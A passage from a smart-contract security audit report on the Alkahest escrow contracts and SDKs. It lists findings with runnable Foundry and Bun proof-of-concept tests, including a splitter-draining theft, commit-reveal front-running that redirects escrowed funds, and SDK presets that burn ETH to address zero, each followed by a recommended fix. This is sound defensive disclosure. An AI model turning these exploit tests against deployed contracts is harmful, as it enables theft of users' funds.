        bytes32 victimEscrow = _createEscrow(victim, victimOracle, VICTIM_NATIVE, VICTIM_ERC20, VICTIM_ERC1155);
        bytes32 victimFulfillment = _createFulfillmentViaSplitter(victimEscrow, victim);

        vm.prank(victimOracle);
        splitter.arbitrate(victimFulfillment, victimEscrow, _singleRecipientSplit(victim, VICTIM_NATIVE, VICTIM_ERC20, VICTIM_ERC1155));

        vm.prank(attacker);
        escrowObligation.collect(victimEscrow, victimFulfillment);

        assertEq(address(splitter).balance, VICTIM_NATIVE, "victim native stranded in splitter");
        assertEq(token.balanceOf(address(splitter)), VICTIM_ERC20, "victim erc20 stranded in splitter");
        assertEq(
            multiToken.balanceOf(address(splitter), ERC1155_ID),
            VICTIM_ERC1155,
            "victim erc1155 stranded in splitter"
        );

        emit log_named_uint("stranded native in splitter", address(splitter).balance);
        emit log_named_uint("stranded erc20 in splitter", token.balanceOf(address(splitter)));
        emit log_named_uint("stranded erc1155 in splitter", multiToken.balanceOf(address(splitter), ERC1155_ID));

        bytes32 attackerEscrow = _createEscrow(attacker, attacker, 0, 0, 0);
        bytes32 attackerFulfillment = _createFulfillmentViaSplitter(attackerEscrow, attacker);

        vm.prank(attacker);
        splitter.arbitrate(
            attackerFulfillment,
            attackerEscrow,
            _singleRecipientSplit(attacker, VICTIM_NATIVE, VICTIM_ERC20, VICTIM_ERC1155)
        );

        uint256 attackerNativeBefore = attacker.balance;
        vm.prank(attacker);
        splitter.collectAndDistribute(address(escrowObligation), attackerEscrow, attackerFulfillment);

        assertEq(attacker.balance - attackerNativeBefore, VICTIM_NATIVE, "attacker steals stranded native");
        assertEq(token.balanceOf(attacker), VICTIM_ERC20, "attacker steals stranded erc20");
        assertEq(multiToken.balanceOf(attacker, ERC1155_ID), VICTIM_ERC1155, "attacker steals stranded erc1155");
        assertEq(address(splitter).balance, 0, "splitter drained of native");
        assertEq(token.balanceOf(address(splitter)), 0, "splitter drained of erc20");
        assertEq(multiToken.balanceOf(address(splitter), ERC1155_ID), 0, "splitter drained of erc1155");

        emit log_named_uint("attacker native stolen", attacker.balance - attackerNativeBefore);
        emit log_named_uint("attacker erc20 stolen", token.balanceOf(attacker));
        emit log_named_uint("attacker erc1155 stolen", multiToken.balanceOf(attacker, ERC1155_ID));
    }

    function _createEscrow(address maker, address oracle, uint256 nativeAmount, uint256 erc20Amount, uint256 erc1155Amount)
        internal
        returns (bytes32)
    {
        vm.prank(maker);
        return escrowObligation.doObligation{value: nativeAmount}(
            _bundleData(oracle, nativeAmount, erc20Amount, erc1155Amount), uint64(block.timestamp + EXPIRATION)
        );
    }

    function _createFulfillmentViaSplitter(bytes32 escrowUid, address fulfiller) internal returns (bytes32) {
        bytes memory obligationData =
            abi.encode(StringObligation.ObligationData({item: "fulfillment", schema: bytes32(0)}));
        vm.prank(fulfiller);
        return splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
    }

    function _bundleData(address oracle, uint256 nativeAmount, uint256 erc20Amount, uint256 erc1155Amount)
        internal
        view
        returns (TokenBundleEscrowObligation.ObligationData memory)
    {
        bytes memory demand = abi.encode(TokenBundleSplitterBase.DemandData({oracle: oracle, data: bytes("")}));

        address[] memory erc20Tokens = new address[](1);
        erc20Tokens[0] = address(token);
        uint256[] memory erc20Amounts = new uint256[](1);
        erc20Amounts[0] = erc20Amount;

        address[] memory erc1155Tokens = new address[](1);
        erc1155Tokens[0] = address(multiToken);
        uint256[] memory erc1155TokenIds = new uint256[](1);
        erc1155TokenIds[0] = ERC1155_ID;
        uint256[] memory erc1155Amounts = new uint256[](1);
        erc1155Amounts[0] = erc1155Amount;

        return TokenBundleEscrowObligation.ObligationData({
            arbiter: address(splitter),
            demand: demand,
            nativeAmount: nativeAmount,
            erc20Tokens: erc20Tokens,
            erc20Amounts: erc20Amounts,
            erc721Tokens: new address[](0),
            erc721TokenIds: new uint256[](0),
            erc1155Tokens: erc1155Tokens,
            erc1155TokenIds: erc1155TokenIds,
            erc1155Amounts: erc1155Amounts
        });
    }

    function _singleRecipientSplit(address recipient, uint256 nativeAmount, uint256 erc20Amount, uint256 erc1155Amount)
        internal
        pure
        returns (TokenBundleSplitterBase.BundleSplit[] memory splits)
    {
        splits = new TokenBundleSplitterBase.BundleSplit[](1);

        uint256[] memory erc20Amounts = new uint256[](1);
        erc20Amounts[0] = erc20Amount;

        uint256[] memory erc1155Amounts = new uint256[](1);
        erc1155Amounts[0] = erc1155Amount;

        splits[0] = TokenBundleSplitterBase.BundleSplit({
            recipient: recipient,
            nativeAmount: nativeAmount,
            erc20Amounts: erc20Amounts,
            erc721Indices: new uint256[](0),
            erc1155Amounts: erc1155Amounts
        });
    }
}
```

#### Recommendation

Add a hard post-collection bound before distribution. For each native/ERC20/ERC1155 component, compute the maximum distributable amount from the current escrow and revert if the stored split exceeds it. That effectively brings `TokenBundleSplitterUnvalidated` back to escrow-local accounting even if you want to keep cheaper oracle writes.

If preserving unvalidated writes is important, another safe design is to snapshot per-escrow collected balances after `collect` and distribute exclusively from that snapshot, never from the splitter's aggregate holdings.

Fix checklist:

- [ ] Snapshot the current escrow's native, ERC20, and ERC1155 deltas immediately after `collect`.
- [ ] Revert before any transfer when a stored split exceeds the snapshot for any asset class.
- [ ] Apply the same post-collection cap check in `unsafePartiallyCollectAndDistribute`.

#### Assumptions

- [x] The victim's balances are already present in `TokenBundleSplitterUnvalidated`, which is realistic because the contract explicitly allows stranded balances and the public direct collect path can create them.
- [x] The attacker must create a later escrow that names the same native/ERC20/ERC1155 assets they want to drain.
- [x] The exploit concerns native/ERC20/ERC1155 only; pre-existing ERC721 inventory is blocked by `_verifyERC721NotAlreadyHeld`.
- [x] The attacker does not need the victim to choose a malicious oracle for the victim's escrow; the attacker only needs oracle control over their own later escrow.
- [x] This is a theft issue, not merely the documented "stuck token" behavior, because the second escrow can actively extract unrelated balances instead of just leaving them stranded.

#### Predicted Invalid Reasons

- `TokenBundleSplitterUnvalidated` is intentionally unsafe and explicitly warns that incorrect splits can revert or strand tokens, so this is expected behavior.

<a id="finding-alka-28"></a>
### ALKA-28 — Supported Ethereum and GenLayer SDK configs send payable helper calls to 0x0

#### Summary

Supported `Ethereum` and `GenLayer Bradbury` presets still map payable helpers to `0x0`. In TypeScript, `client.attestation.util.attestAndCreateReferenceEscrow(...)` can send ETH straight to the zero address; in Rust/Python, the unconditional native-token escrow path does the same with `Address::ZERO`.

#### Context Files

##### ts config preset addresses

Path: `alkahest/sdks/ts/src/config.ts`
Highlight lines: 1

```typescript
"GenLayer Bradbury": {
  ...unreleasedAddresses,
  atomicAttestationUtils: "0x0000000000000000000000000000000000000000",
  ...
},
"Ethereum": {
  ...unreleasedAddresses,
  atomicAttestationUtils: "0x0000000000000000000000000000000000000000",
  ...
}
export const supportedChains = ["Base Sepolia", "Sepolia", "GenLayer Bradbury", "Ethereum"];
```

##### ts attestation helper

Path: `alkahest/sdks/ts/src/clients/obligations/attestation/util.ts`
Highlight lines: 1

```typescript
const hash = await viemClient.writeContract({
  address: addresses.atomicUtils,
  functionName: "attestAndCreateReferenceEscrow",
  args: [addresses.attestationReferenceEscrowObligation, request, escrowData, escrowExpirationTime],
  value: request.data.value,
  chain: viemClient.chain,
});
```

##### rs preset zero-address escrow target

Path: `alkahest/sdks/rs/src/addresses.rs`
Highlight lines: 1

```rust
native_token_addresses: NativeTokenAddresses {
    ...
    escrow_obligation_unconditional: Address::ZERO,
    ...
},
```

##### rs unconditional escrow helper

Path: `alkahest/sdks/rs/src/clients/obligations/native_token/escrow/unconditional.rs`
Highlight lines: 1

```rust
let receipt = escrow_obligation_contract
    .doObligation(..., expiration)
    .value(price.value)
    .send()
    .await?
    .get_receipt()
    .await?;
```

#### Proof of Concept

- Start a local Anvil node on `127.0.0.1:9545`.
- Save the Bun test as `sdks/ts/tests/unit/POC_attestation_zero_address_burn_fa4700e6.test.ts`.
- Run the test against `sdks/ts` and observe successful payable calls from both shipped presets to `0x0` with `value = 1n`.

##### Start local Anvil node

Path: ``

```bash
anvil --host 127.0.0.1 --port 9545 --chain-id 31337
```

##### POC test

Path: `sdks/ts/tests/unit/POC_attestation_zero_address_burn_fa4700e6.test.ts`

```typescript
/**
 * @title POC: Supported Ethereum/GenLayer presets route payable attestation helpers to `0x0`
 * @notice Proof Statement: Prove that the shipped `"Ethereum"` and `"GenLayer Bradbury"` presets are treated as supported by `makeClient`, initialize `client.attestation.util` with `atomicAttestationUtils = 0x0000000000000000000000000000000000000000`, and a normal `attestAndCreateReferenceEscrow` call sends a successful value-bearing transaction whose destination is `0x0`. This validates that the SDK can burn ETH on these presets before any helper contract runs.
 *
 * Bug Vector:
 * 1. Construct a wallet client whose `chain.name` matches one of the shipped supported presets.
 * 2. Let `makeClient` auto-resolve the default address map and extension tree.
 * 3. Call `client.attestation.util.attestAndCreateReferenceEscrow(...)` with a non-zero `request.data.value`.
 * 4. Observe that the mined transaction targets `0x0`, carries the supplied value, and emits no attestation logs because no helper contract exists there.
 */

import { describe, expect, test } from "bun:test";
import { createPublicClient, createWalletClient, http, zeroAddress } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { supportedChains } from "../../src/config.ts";
import { makeClient } from "../../src/index.ts";

const RPC_URL = process.env.ANVIL_RPC_URL ?? "http://127.0.0.1:9545";
const account = privateKeyToAccount(
  "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
);

const makeChain = (name: "Ethereum" | "GenLayer Bradbury") =>
  ({
    id: 31337,
    name,
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: {
      default: {
        http: [RPC_URL],
      },
    },
  }) as const;

describe("POC: supported presets can burn ETH via atomic attestation helper", () => {
  for (const chainName of ["Ethereum", "GenLayer Bradbury"] as const) {
    test(`${chainName} preset sends the payable helper call to 0x0`, async () => {
      const chain = makeChain(chainName);
      const walletClient = createWalletClient({
        account,
        chain,
        transport: http(RPC_URL),
      });
      const publicClient = createPublicClient({
        chain,
        transport: http(RPC_URL),
      });
      const client = makeClient(walletClient);

      expect(supportedChains).toContain(chainName);
      expect(client.attestation.util.address).toBe(zeroAddress);
      expect(client.contractAddresses.atomicAttestationUtils).toBe(zeroAddress);

      const nonceBefore = await publicClient.getTransactionCount({ address: account.address });
      const balanceBefore = await publicClient.getBalance({ address: account.address });

      const result = await client.attestation.util.attestAndCreateReferenceEscrow(
        {
          schema: (`0x${"11".repeat(32)}`) as `0x${string}`,
          data: {
            recipient: account.address,
            expirationTime: 0n,
            revocable: true,
            refUID: (`0x${"00".repeat(32)}`) as `0x${string}`,
            data: "0x",
            value: 1n,
          },
        },
        {
          arbiter: account.address,
          demand: "0x",
          validationExpirationTime: 0n,
          validationRevocable: true,
        },
        0n,
      );

      const tx = await publicClient.getTransaction({ hash: result.hash });
      const receipt = await publicClient.waitForTransactionReceipt({ hash: result.hash });
      const nonceAfter = await publicClient.getTransactionCount({ address: account.address });
      const balanceAfter = await publicClient.getBalance({ address: account.address });

      expect(receipt.status).toBe("success");
      expect(tx.to).toBe(zeroAddress);
      expect(tx.value).toBe(1n);
      expect(tx.input !== "0x").toBe(true);
      expect(result.attestation).toBeUndefined();
      expect(result.escrow).toBeUndefined();
      expect(nonceAfter).toBe(nonceBefore + 1);
      expect(balanceAfter < balanceBefore).toBe(true);
    });
  }
});
```

##### Run the PoC test

Path: ``

```bash
cd sdks/ts
ANVIL_RPC_URL=http://127.0.0.1:9545 bun test tests/unit/POC_attestation_zero_address_burn_fa4700e6.test.ts --timeout 60000
```

#### Recommendation

The safest fix is to stop advertising partially deployed networks as supported until every default namespace resolves to a live contract.

At minimum:

```typescript
if (address === zeroAddress) {
  throw new Error("Helper is not deployed on this chain");
}
```

Apply that check when constructing extensions and again inside every payable helper method. In Rust/Python, reject `Address::ZERO` during module initialization for any contract that can receive value.

Fix checklist:

- [ ] Remove `Ethereum` and `GenLayer Bradbury` from the public supported-chain lists until every payable helper is deployed.
- [ ] Reject `0x0` and `Address::ZERO` when building default contract address maps and extension/module configs for value-bearing helpers.
- [ ] Re-check each payable helper's configured target immediately before `writeContract(...)` or `.send()` and abort on zero addresses.

#### Assumptions

- [x] The victim uses a shipped preset such as `Ethereum`, `GenLayer Bradbury`, `ethereum_mainnet`, or `genlayer_bradbury` rather than pruning the helper tree.
- [x] The helper call carries non-zero `request.data.value` or `price.value`.
- [x] Standard EVM semantics apply, so a transaction to `0x0000000000000000000000000000000000000000` can still transfer ETH.

#### Predicted Invalid Reasons

- “Those are just unreleased placeholders; users are not supposed to call them.”

<a id="finding-alka-2"></a>
### ALKA-2 — Oracle-gated commit-reveal still allows post-reveal settlement theft before collect

#### Summary

`CommitRevealObligation` refunds the revealer's bond immediately but does not reserve the escrow for the first valid reveal. In the shipped `AllArbiter(commitReveal, trustedOracle)` flow, a thief can copy the now-public payload, create a fresh commitment under their own address, get a separate oracle approval for their own `fulfillmentUid`, and front-run `collect()` to redirect the escrow to themselves.

#### Context Files

##### CommitRevealObligation.sol

Path: `contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 1

```solidity
function doObligation(ObligationData calldata data, bytes32 refUID) external returns (bytes32 uid_) {
    bytes memory encodedData = abi.encode(data);
    uid_ = _doObligationForRaw(encodedData, 0, msg.sender, refUID);
}

function _afterAttest(Attestation memory attestation) internal override {
    bytes32 revealedCommitment =
        keccak256(abi.encode(attestation.refUID, attestation.recipient, keccak256(attestation.data)));
    CommitInfo memory info = commitments[revealedCommitment];
    ...
    uint256 amount = info.bondAmount;
    commitmentClaimed[revealedCommitment] = true;
    (bool success,) = info.committer.call{value: amount}("");
    if (!success) revert BondTransferFailed(info.committer, amount);
}
```

##### BaseEscrowObligation.sol

Path: `contracts/src/BaseEscrowObligation.sol`
Highlight lines: 1

```solidity
function collect(bytes32 _escrow, bytes32 _fulfillment)
    public
    virtual
    override
    nonReentrant
    returns (bytes memory)
{
    Attestation memory escrow = _getExistingAttestation(_escrow);
    Attestation memory fulfillment = _getExistingAttestation(_fulfillment);
    ...
    if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
        revert InvalidFulfillment();
    }
    ...
    bytes memory result = _releaseEscrow(escrow, fulfillment.recipient, _fulfillment);
```

##### TrustedOracleArbiter.sol

Path: `contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 1

```solidity
function arbitrate(bytes32 fulfillmentUid, bytes memory demand, bool decision) public {
    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillmentUid, demand));
    decisions[msg.sender][decisionKey] = decision;
}

function check(Attestation memory fulfillment, bytes memory demand, bytes32)
    public
    view
    override
    returns (bool)
{
    DemandData memory demand_ = abi.decode(demand, (DemandData));
    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillment.uid, demand_.data));
    return decisions[demand_.oracle][decisionKey];
}
```

#### Proof of Concept

Foundry PoC: Bob reveals and gets oracle approval first, Eve copies the public payload into a fresh commitment under her own address, reveals one block later, gets a separate approval, and calls `nativeEscrow.collect(escrowUid, eveFulfillmentUid)` before Bob. Bob's later `collect()` reverts with `AttestationRevoked()`.

##### POC_CommitRevealObligation_56473c09.t.sol

Path: `contracts/test/poc/POC_CommitRevealObligation_56473c09.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {IEAS, Attestation} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {CommitRevealObligation} from "@src/obligations/CommitRevealObligation.sol";
import {NativeTokenEscrowObligation} from "@src/obligations/escrow/default/NativeTokenEscrowObligation.sol";
import {TrustedOracleArbiter} from "@src/arbiters/TrustedOracleArbiter.sol";
import {AllArbiter} from "@src/arbiters/logical/AllArbiter.sol";
import {ArbiterUtils} from "@src/libraries/ArbiterUtils.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

/**
 * @title POC: Oracle-Gated Commit-Reveal Still Allows Post-Reveal Settlement Theft
 * @notice Proof Statement: Prove that, when a default escrow composes `CommitRevealObligation`
 * with `TrustedOracleArbiter` through `AllArbiter`, Bob's first valid reveal does not reserve
 * settlement rights. After Bob reveals and Charlie approves Bob's fulfillment, Eve can copy the
 * now-public revealed data, commit it under her own address, wait one block, obtain her own oracle
 * approval, and collect the escrow before Bob.
 */
contract POC_CommitRevealObligation_56473c09 is Test {
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;
    CommitRevealObligation internal commitReveal;
    TrustedOracleArbiter internal trustedOracleArbiter;
    AllArbiter internal allArbiter;
    NativeTokenEscrowObligation internal nativeEscrow;

    address internal alice;
    address internal bob;
    address internal charlie;
    address internal eve;

    uint256 internal constant ESCROW_AMOUNT = 5 ether;
    uint256 internal constant BOND = 0.1 ether;
    uint256 internal constant COMMIT_DEADLINE = 1 hours;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        commitReveal = new CommitRevealObligation(eas, schemaRegistry, address(0));
        trustedOracleArbiter = new TrustedOracleArbiter(eas);
        allArbiter = new AllArbiter();
        nativeEscrow = new NativeTokenEscrowObligation(eas, schemaRegistry);

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        eve = makeAddr("eve");

        vm.deal(alice, 10 ether);
        vm.deal(bob, 1 ether);
        vm.deal(charlie, 1 ether);
        vm.deal(eve, 1 ether);

        vm.roll(1);
        vm.warp(1);
    }

    function testCopiedRevealCanStealApprovedSettlementBeforeOriginalCollector() public {
        bytes memory oracleInnerDemand = abi.encode("capitalize hello world");
        bytes memory allDemand = _composeDemand(oracleInnerDemand);

        NativeTokenEscrowObligation.ObligationData memory escrowData = NativeTokenEscrowObligation.ObligationData({
            arbiter: address(allArbiter),
            demand: allDemand,
            amount: ESCROW_AMOUNT
        });

        vm.prank(alice);
        bytes32 escrowUid = nativeEscrow.doObligation{value: ESCROW_AMOUNT}(escrowData, uint64(block.timestamp + 1 days));

        CommitRevealObligation.ObligationData memory bobData = CommitRevealObligation.ObligationData({
            payload: abi.encode("HELLO WORLD"),
            salt: keccak256("bob-salt"),
            schema: bytes32("schema-tag")
        });

        bytes32 bobCommitment = commitReveal.computeCommitment(escrowUid, bob, bobData);

        vm.prank(bob);
        commitReveal.commit{value: BOND}(bobCommitment, COMMIT_DEADLINE);

        assertEq(bob.balance, 0.9 ether, "bob posted the commit bond");

        vm.roll(2);

        vm.prank(bob);
        bytes32 bobFulfillmentUid = commitReveal.doObligation(bobData, escrowUid);

        assertEq(bob.balance, 1 ether, "bob bond is refunded immediately on reveal");

        vm.prank(charlie);
        trustedOracleArbiter.arbitrate(bobFulfillmentUid, oracleInnerDemand, true);

        Attestation memory bobFulfillment = eas.getAttestation(bobFulfillmentUid);
        assertTrue(allArbiter.check(bobFulfillment, allDemand, escrowUid), "bob has a fully valid fulfillment");

        CommitRevealObligation.ObligationData memory copiedData =
            abi.decode(bobFulfillment.data, (CommitRevealObligation.ObligationData));
        bytes32 eveCommitment = commitReveal.computeCommitment(escrowUid, eve, copiedData);

        vm.prank(eve);
        commitReveal.commit{value: BOND}(eveCommitment, COMMIT_DEADLINE);

        vm.roll(3);

        vm.prank(eve);
        bytes32 eveFulfillmentUid = commitReveal.doObligation(copiedData, escrowUid);

        vm.prank(charlie);
        trustedOracleArbiter.arbitrate(eveFulfillmentUid, oracleInnerDemand, true);

        Attestation memory eveFulfillment = eas.getAttestation(eveFulfillmentUid);
        assertTrue(allArbiter.check(eveFulfillment, allDemand, escrowUid), "eve cloned fulfillment is also valid");

        uint256 eveBalanceBeforeCollect = eve.balance;

        vm.prank(eve);
        nativeEscrow.collect(escrowUid, eveFulfillmentUid);

        assertEq(eve.balance, eveBalanceBeforeCollect + ESCROW_AMOUNT, "eve receives the escrowed funds");
        assertEq(bob.balance, 1 ether, "bob never receives the escrow despite earlier approval");

        vm.prank(bob);
        vm.expectRevert(ArbiterUtils.AttestationRevoked.selector);
        nativeEscrow.collect(escrowUid, bobFulfillmentUid);
    }

    function _composeDemand(bytes memory oracleInnerDemand) internal view returns (bytes memory demand) {
        address[] memory arbiters = new address[](2);
        arbiters[0] = address(commitReveal);
        arbiters[1] = address(trustedOracleArbiter);

        bytes[] memory demands = new bytes[](2);
        demands[0] =
            abi.encode(CommitRevealObligation.DemandData({bondAmount: BOND, commitDeadline: COMMIT_DEADLINE}));
        demands[1] = abi.encode(TrustedOracleArbiter.DemandData({oracle: charlie, data: oracleInnerDemand}));

        demand = abi.encode(AllArbiter.DemandData({arbiters: arbiters, demands: demands}));
    }
}
```

##### forge test command

Path: `contracts/`

```bash
timeout 300 forge test --match-path test/poc/POC_CommitRevealObligation_56473c09.t.sol -vvvv
```

#### Recommendation

Preserve settlement rights for the first valid revealer instead of only validating the *current* revealer’s local commitment.

A robust fix is to reserve the escrow for the first successful reveal and require later collection or arbitration to stay bound to that reserved recipient/fulfillment lineage:

```solidity
mapping(bytes32 => address) public reservedFulfiller;

function _afterAttest(Attestation memory attestation) internal override {
    bytes32 escrowUid = attestation.refUID;
    address existing = reservedFulfiller[escrowUid];
    if (existing != address(0) && existing != attestation.recipient) revert EscrowAlreadyReserved();
    reservedFulfiller[escrowUid] = attestation.recipient;
    ...
}
```

If commit-reveal must compose with UID-keyed arbiters, add an escrow-side rule that only the reserved fulfiller (or the first revealed fulfillment UID) can later satisfy collection. Alternatively, redesign the companion arbiter so that any required approval can be precommitted before reveal and used inside an actually atomic reveal-and-collect path.

#### Assumptions

- [x] The escrow uses `AllArbiter(commitReveal, trustedOracle)` and the oracle can approve more than one objectively correct fulfillment for the same escrow.
- [x] The honest fulfiller cannot complete oracle approval and collection atomically inside the reveal transaction.
- [x] An attacker can wait one block after the honest reveal and submit a cloned commitment for the same escrow.

#### Predicted Invalid Reasons

- The oracle can simply refuse the copied fulfillment, or users can choose a different arbiter.

<a id="finding-alka-19"></a>
### ALKA-19 — Supported-chain presets silently wire unreleased hook and splitter surfaces to address(0), allowing ETH burns

#### Summary

On supported chains like `Ethereum` and `GenLayer Bradbury`, the SDK spreads `unreleasedAddresses` into the preset map, so hook escrows, hooks, and splitters can resolve to `address(0)` while `makeClient()` still exposes `hookBased` and `splitters`. The hook-based `create()` helpers then send ETH directly to those zero-address targets and only fail afterward when no `Attested` event exists, so a user can burn funds on a chain the docs say will load the correct contract addresses.

#### Context Files

##### unreleasedAddresses zero-fallbacks

Path: `sdks/ts/src/config.ts`
Highlight lines: 2, 4, 5, 6, 8, 10

```typescript
const unreleasedAddresses = {
  erc20UnconditionalEscrowObligation: zeroAddress,
  ...
  hookEscrowObligation: zeroAddress,
  hooksEscrowObligation: zeroAddress,
  erc20EscrowHook: zeroAddress,
  ...
  erc20Splitter: zeroAddress,
  ...
  tokenBundleSplitterUnvalidated: zeroAddress,
};
```

##### Ethereum preset inherits unreleased addresses

Path: `sdks/ts/src/config.ts`
Highlight lines: 1, 2, 3

```typescript
"Ethereum": {
  ...unreleasedAddresses,
  eas: "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587",
  ...
}
```

##### supportedChains includes supported unsupported surfaces

Path: `sdks/ts/src/config.ts`
Highlight lines: 1

```typescript
supportedChains = ["Base Sepolia", "Sepolia", "GenLayer Bradbury", "Ethereum"]
```

##### makeDefaultExtension exposes hookBased and splitters

Path: `sdks/ts/src/extensions.ts`
Highlight lines: 1, 2

```typescript
hookBased: makeHookBasedClient(client.viemClient, pickHookBasedAddresses(client.contractAddresses)),
splitters: makeSplittersClient(client.viemClient, pickSplitterAddresses(client.contractAddresses)),
```

##### hook-based create paths send value directly

Path: `sdks/ts/src/clients/obligations/hookBased/index.ts`
Highlight lines: 1, 3, 10, 12

```typescript
create: async (data, expiration, value = 0n) => {
  const hash = await writeContract(viemClient, {
    address: addresses.hookEscrowObligation,
    functionName: "doObligation",
    args: [data, expiration],
    value,
  });
}

create: async (data, expiration, value = data.values.reduce((a, b) => a + b, 0n)) => {
  const hash = await writeContract(viemClient, {
    address: addresses.hooksEscrowObligation,
    functionName: "doObligation",
    args: [data, expiration],
    value,
  });
}
```

##### writeContract is a thin wrapper

Path: `sdks/ts/src/utils/index.ts`
Highlight lines: 1, 2

```typescript
export const writeContract = async (viemClient, params) => {
  return viemClient.writeContract({ ...params, chain: viemClient.chain });
};
```

##### docs promise correct contract addresses

Path: `docs/skills/alkahest-user/references/typescript-sdk.md`
Highlight lines: 1

```markdown
The client auto-detects the chain and loads the correct contract addresses.
```

#### Proof of Concept

Create the Bun test below, run it against an Anvil chain named `Ethereum`, and observe that `supportedChains` contains `mainnet.name`, `client.contractAddresses.hookEscrowObligation` and `client.contractAddresses.erc20Splitter` resolve to `zeroAddress`, and `client.hookBased.escrow.single.create()` mines a successful transaction to `address(0)` before the helper throws `No Attested event found in transaction`.

##### POC: Supported Ethereum preset burns ETH through zero-address hook escrow

Path: `sdks/ts/tests/unit/POC_hookSplitters.test_04729c2f.ts`

```typescript
import { createAnvil } from "@viem/anvil";
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createPublicClient, createWalletClient, http, parseEther, publicActions, zeroAddress } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { mainnet } from "viem/chains";
import { makeClient, supportedChains } from "../../src";

/**
 * @title POC: Supported Ethereum preset burns ETH through zero-address hook escrow
 * @notice Proof Statement: Prove that the SDK treats `Ethereum` as supported, auto-loads a zero `hookEscrowObligation`
 * address for that chain, and lets `hookBased.escrow.single.create()` broadcast a successful value-bearing transaction
 * to `address(0)` before throwing only because no `Attested` event exists; this validates that ETH can be burned through
 * an officially exposed helper on a supported-chain preset.
 */

describe("POC supported-chain zero-address hook escrow burn", () => {
  const port = Math.floor(Math.random() * 10_000) + 45_000;
  const rpcUrl = `http://127.0.0.1:${port}`;
  const anvil = createAnvil({
    chainId: 1,
    blockBaseFeePerGas: 0n,
    host: "127.0.0.1",
    port,
  });

  const account = privateKeyToAccount(
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
  );
  const transport = http(rpcUrl, { timeout: 60_000 });
  const walletClient = createWalletClient({
    account,
    chain: mainnet,
    transport,
    pollingInterval: 200,
  }).extend(publicActions);
  const publicClient = createPublicClient({
    chain: mainnet,
    transport,
  });

  beforeAll(async () => {
    await anvil.start();
  });

  afterAll(async () => {
    await Bun.spawn([
      "bash",
      "-lc",
      `pkill -f 'anvil.*--port ${port}' 2>/dev/null || true`,
    ]).exited;
  });

  test("burns ETH before surfacing an attestation error", async () => {
    expect(supportedChains).toContain(mainnet.name);

    const client = makeClient(walletClient);
    expect(client.contractAddresses.hookEscrowObligation).toBe(zeroAddress);
    expect(client.contractAddresses.erc20Splitter).toBe(zeroAddress);

    const burnValue = parseEther("1");
    const zeroCodeBefore = (await publicClient.getCode({ address: zeroAddress })) ?? null;
    const zeroBalanceBefore = await publicClient.getBalance({ address: zeroAddress });

    let errorMessage = "";
    let hash: `0x${string}` | undefined;
    try {
      await client.hookBased.escrow.single.create(
        {
          arbiter: account.address,
          demand: "0x",
          hook: account.address,
          hookData: "0x",
        },
        0n,
        burnValue,
      );
    } catch (error) {
      errorMessage = error instanceof Error ? error.message : String(error);
      const match = errorMessage.match(/transaction (0x[a-fA-F0-9]{64})/);
      hash = match?.[1] as `0x${string}` | undefined;
    }

    expect(errorMessage).toContain("No Attested event found in transaction");
    expect(hash).toBeDefined();

    const receipt = await publicClient.getTransactionReceipt({ hash: hash! });
    const zeroCodeAfter = (await publicClient.getCode({ address: zeroAddress })) ?? null;
    const zeroBalanceAfter = await publicClient.getBalance({ address: zeroAddress });

    expect(zeroCodeBefore).toBeNull();
    expect(zeroCodeAfter).toBeNull();
    expect(receipt.status).toBe("success");
    expect(receipt.to).toBe(zeroAddress);
    expect(receipt.logs).toHaveLength(0);
    expect(zeroBalanceAfter - zeroBalanceBefore).toBeGreaterThanOrEqual(burnValue);
  });
});
```

#### Recommendation

Fail closed on undeployed surfaces.

```text
- Remove unreleased features from supported-chain presets instead of filling them with zero addresses.
- Do not construct hook/splitter/unconditional clients when their address is zero.
- Add runtime guards that reject zero-address or no-code destinations before any write.
- Document support per feature, not just per chain.
```

Fix checklist:

- [ ] Remove unreleased features from supported-chain presets instead of filling them with `address(0)`.
- [ ] Do not construct hook, splitter, or unconditional clients when the configured address is zero.
- [ ] Add runtime guards that reject `address(0)` and no-code destinations before any write.

#### Assumptions

- [x] A victim uses the official TypeScript SDK on `Ethereum` or `GenLayer Bradbury`.
- [x] The victim is induced to call a hook-based path with nonzero `value` (or another direct-write undeployed surface).
- [x] Standard EVM semantics apply: sending ETH to an address with no code does not execute contract logic and irreversibly transfers the value.
- [x] The victim does not manually inspect `client.contractAddresses` before using the exposed helper.

#### Predicted Invalid Reasons

- Those features are unreleased, and the zero addresses are visible if users inspect the config.

<a id="medium"></a>
## Medium

<a id="finding-alka-9"></a>
### ALKA-9 — TrustedOracle manual arbitration helper records a decision key that collect() never checks

#### Summary

The public `trustedOracle.arbitrate()` helper forwards the outer `DemandData` bytes unchanged, but `TrustedOracleArbiter.check()` later verifies only `demand_.data`. A successful manual arbitration can therefore still leave `collect()` reverting, and an expiring escrow may be reclaimed before the oracle resubmits the inner payload.

#### Context Files

##### TrustedOracleArbiter.sol

Path: `contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 45, 72

```solidity
function arbitrate(bytes32 fulfillmentUid, bytes memory demand, bool decision) public {
    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillmentUid, demand));
    decisions[msg.sender][decisionKey] = decision;
}

function check(Attestation memory fulfillment, bytes memory demand, bytes32) public view returns (bool) {
    DemandData memory demand_ = abi.decode(demand, (DemandData));
